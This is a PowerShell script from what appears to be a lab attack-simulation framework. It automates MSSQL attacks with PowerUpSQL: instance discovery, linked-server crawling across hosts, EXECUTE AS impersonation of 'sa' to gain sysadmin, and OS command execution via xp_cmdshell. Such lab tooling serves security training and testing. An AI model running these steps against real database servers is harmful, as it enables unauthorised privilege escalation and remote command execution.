# CADRE — WT#040-043 MSSQL (linked-server hop / xp_cmdshell / impersonation)
. ..\lib\cadre-env.ps1
. ..\lib\common.ps1
print_banner "WT#040-043 - MSSQL Attacks"
start_attack "040" "MSSQL linked-server hop"
require_tool powerupsql.ps1

step "Discover SQL instances + access (PowerUpSQL)"
run_cmd ". .\powerupsql.ps1; Get-SQLInstanceDomain | Get-SQLConnectionTest"

step "WT#040 Crawl linked servers (mbr01 -> mbr02 -> linux01)"
run_cmd "Get-SQLServerLinkCrawl -Instance mbr01.$DOMAIN_CHILD -Query 'SELECT @@version'"

step "WT#043 Impersonation: EXECUTE AS to escalate to sysadmin"
run_cmd "Get-SQLQuery -Instance mbr01.$DOMAIN_CHILD -Query `"EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')`""

step "WT#041 Command exec via xp_cmdshell across the link"
run_cmd "Invoke-SQLOSCmd -Instance mbr01.$DOMAIN_CHILD -Command 'whoami' -RawResults"

result $LASTEXITCODE "MSSQL Attacks completed"
